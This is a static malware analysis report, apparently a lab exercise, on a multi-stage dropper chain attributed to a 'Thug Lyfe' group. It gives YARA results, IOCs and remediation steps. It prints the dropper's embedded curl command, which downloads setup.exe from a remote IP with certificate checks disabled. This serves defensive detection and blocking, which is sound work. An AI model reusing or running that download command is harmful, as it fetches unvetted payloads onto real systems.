# Cyber Malware Analysis Report

## Case Details

**Date:** October 6, 2025  
**Analyst:** Dylan Pallatroni  
**Threat Group:** Thug Lyfe  
**Number of Samples Analyzed:** 4  
**Malicious Samples:** 3  
**Benign Samples:** 1

---

## Executive Summary

This report documents the analysis of four files associated with the **Thug Lyfe** threat group. Three files were identified as malicious through YARA rule scanning and behavioral analysis, while one file (exe_windows_64.exe) was determined to be benign. The malicious samples consist of a packed dropper (dasuwerugwuerwq.exe), an intermediate dropper (simplecalc.exe), and an embedded PE installer (setup.exe). The attack chain begins with a UPX-packed executable that downloads and executes a secondary dropper, which then retrieves the final payload containing embedded malicious code.


---

## Analysis Methodology

### YARA Rule Scanning

All samples were scanned using both cursory analysis rules and custom Thug Lyfe threat group signatures. The cursory analysis rules included:

- EntropyGreaterThan7
- fileUsingUPX
- detect_pe_exe
- FirstSectionFormat
- EXESectionsCount
- check_rsrc
- missingPE_Sections
- hasDOStext
- OtherThanUsual
- detect_unusual_string

Custom rules were developed in **thugLyfe.yar** to specifically identify the three malicious samples associated with this threat group.

### Validation Testing

The thugLyfe.yar ruleset was validated against the Windows System32 directory with **zero false positives**, confirming the rules are sufficiently specific to avoid matching legitimate system files.

---

## Sample 1: dasuwerugwuerwq.exe (Packed Dropper)

### Sample Information

| Attribute | Value |
|-----------|-------|
| **File name** | dasuwerugwuerwq.exe |
| **Classification** | MALICIOUS |
| **YARA Rule Match** | is_thugStylePacked |

### YARA Detection Results

**Matched Strings:**
- `$upx1`: UPX0
- `$upx2`: UPX1
- `$http`: ttps
- `$installer`: setup.exe
- `$string2`: lyfe

### Cursory Analysis YARA Matches

- **fileUsingUPX**: Positive - File is packed with UPX
- **detect_pe_exe**: Positive - Contains DOS stub
- **FirstSectionFormat**: Positive - MZ header present

### Behavioral Assessment

Based on observed artifacts, this file appears to function as the initial infection vector in the Thug Lyfe attack chain. The presence of UPX packing indicates obfuscation techniques to evade detection. String artifacts reveal references to "setup.exe" and HTTPS protocol indicators, suggesting this dropper is designed to download or execute a secondary payload. The strings "thug" and "lyfe" provide attribution to the threat group.

### Indicators of Compromise

**File Artifacts:**
- References to setup.exe installer
- UPX packing signatures

**Network Indicators:**
- HTTPS protocol strings (partial: "ttps")

---

## Sample 2: setup.exe (Embedded PE Installer)

### Sample Information

| Attribute | Value |
|-----------|-------|
| **File name** | setup.exe |
| **Classification** | MALICIOUS |
| **YARA Rule Match** | is_thugStyleEmbeddedPE |

### YARA Detection Results

**Matched Strings:**
- `$notNice`: I'm really mean. RAAAAH!
- `$dosMode`: This program cannot be run in DOS mode (detected 2+ times)

**Matched Conditions:**
- Abnormal number of exports (outside 5-10 range)
- Abnormal number of sections (outside 6-8 range)
- Valid PE headers confirmed (MZ and PE signatures)
- Multiple DOS stub occurrences indicating embedded PE file

### Cursory Analysis YARA Matches

- **detect_pe_exe**: Positive - Contains DOS stub
- **hasDOStext**: Positive - DOS mode string present
- **EXESectionsCount**: Positive - Abnormal section count detected
- **FirstSectionFormat**: Positive - MZ header present

### Behavioral Assessment

This file exhibits characteristics of an installer containing an embedded portable executable. The presence of multiple "This program cannot be run in DOS mode" strings is a strong indicator of PE file embedding, as this string should typically appear only once in a legitimate executable. The unusual string "I'm really mean. AAH!" serves as a unique identifier for this malware variant. The abnormal section count and export table size further support malicious classification.

### Indicators of Compromise

**File Artifacts:**
- Embedded PE file detected
- Unusual string: "I'm really mean. RAAAAH!"
- Abnormal PE structure (sections and exports)

---

## Sample 3: simplecalc.exe (Dropper)

### Sample Information

| Attribute | Value |
|-----------|-------|
| **File name** | simplecalc.exe |
| **Classification** | MALICIOUS |
| **YARA Rule Match** | is_thugStyleDropper |

### YARA Detection Results

**Matched Strings:**
- `$curl`: curl -k -o setup.exe https://165.73.244.11/installers/setup.exe

**Matched Conditions:**
- Abnormal number of exports (outside 5-10 range)
- Abnormal number of sections (outside 6-8 range)
- Valid PE headers confirmed (MZ and PE signatures)

### Cursory Analysis YARA Matches

- **detect_pe_exe**: Positive - Contains DOS stub
- **hasDOStext**: Positive - DOS mode string present
- **EXESectionsCount**: Positive - Abnormal section count detected
- **FirstSectionFormat**: Positive - MZ header present

### Behavioral Assessment

This file functions as a dropper designed to retrieve the setup.exe payload from a remote server. The embedded curl command reveals the complete attack infrastructure, including the command and control server IP address (165.73.244.11) and download path. The use of the `-k` flag in the curl command indicates the malware bypasses SSL certificate validation, allowing communication with potentially self-signed or invalid certificates. This file serves as the intermediary between the initial packed dropper and the final embedded PE installer.

### Indicators of Compromise

**Network Indicators:**
- C2 Server IP: 165.73.244.11
- Download URL: https://165.73.244.11/installers/setup.exe
- Protocol: HTTPS with certificate validation bypass

**File Artifacts:**
- Curl command string embedded
- Abnormal PE structure

**Behavioral Indicators:**
- Downloads setup.exe to local system
- Uses insecure SSL practices

---

## Sample 4: exe_windows_64.exe (Benign)

### Sample Information

| Attribute | Value |
|-----------|-------|
| **File name** | exe_windows_64.exe |
| **Classification** | BENIGN |
| **YARA Rule Match** | None |

### Analysis Results

This file did not match any of the Thug Lyfe custom rules or exhibit suspicious characteristics in cursory analysis. The file contains:

- Standard PE structure with normal section count
- No packing or obfuscation detected
- No suspicious strings or network indicators
- Standard DOS stub with no anomalies
- Normal export and import tables

### Benign Classification Justification

The file exhibits all characteristics of a legitimate Windows executable:

1. **No malicious indicators**: Zero matches on threat-specific YARA rules
2. **Standard PE structure**: Section count, headers, and metadata within normal ranges
3. **No obfuscation**: No packing, encryption, or anti-analysis techniques detected
4. **No suspicious strings**: No command and control indicators, malicious commands, or threat group attribution strings
5. **Clean behavioral profile**: No embedded files, suspicious network activity indicators, or persistence mechanisms observed

---

## Attack Chain Analysis

Based on observed artifacts, the Thug Lyfe attack chain operates as follows:

1. **Initial Infection (dasuwerugwuerwq.exe)**: UPX-packed dropper delivers or executes the next stage
2. **Secondary Dropper (simplecalc.exe)**: Downloads setup.exe from remote server 165.73.244.11
3. **Final Payload (setup.exe)**: Embedded PE installer executes malicious code

---

## Indicators of Compromise Summary

### Network-Based IOCs

- **IP Address**: 165.73.244.11
- **URL**: https://165.73.244.11/installers/setup.exe
- **Protocol Pattern**: HTTPS with certificate bypass (-k flag)

### File-Based IOCs

- **Filenames**: dasuwerugwuerwq.exe, simplecalc.exe, setup.exe
- **Packing**: UPX compression
- **Unique Strings**: 
  - "I'm really mean. RAAAAH!"
  - "thug", "lyfe"
  - "curl -k -o setup.exe https://165.73.244.11/installers/setup.exe"

### Behavioral IOCs

- UPX-packed executables
- Abnormal PE section counts (outside 6-8 range)
- Abnormal export counts (outside 5-10 range)
- Embedded PE files (multiple DOS stubs)
- SSL certificate validation bypass

---

## YARA Rule Validation

### False Positive Testing

The custom **thugLyfe.yar** ruleset was tested against the C:\Windows\System32 directory with **zero matches**, confirming no false positives against legitimate Windows system files.

### True Positive Confirmation

All three malicious samples (dasuwerugwuerwq.exe, simplecalc.exe, setup.exe) correctly matched their respective YARA rules, with proper string and condition matching.

---

## Remediation Recommendations

1. **Network-level blocking**: Block all traffic to IP 165.73.244.11
2. **File removal**: Delete identified malicious files if found in the environment
3. **YARA deployment**: Deploy thugLyfe.yar ruleset to endpoint detection systems
4. **IOC hunting**: Search for additional instances using provided IOCs
5. **Traffic monitoring**: Monitor for HTTPS connections with SSL bypass patterns

---

## Additional Examiner Notes

All analysis was conducted based solely on static analysis and YARA rule matching. No dynamic execution was performed. The relationship between the three malicious files suggests a multi-stage attack designed to evade detection through packing, network-based payload delivery, and PE embedding techniques. The presence of the benign file (exe_windows_64.exe) in the sample set confirms the YARA rules are properly tuned to avoid false positives.
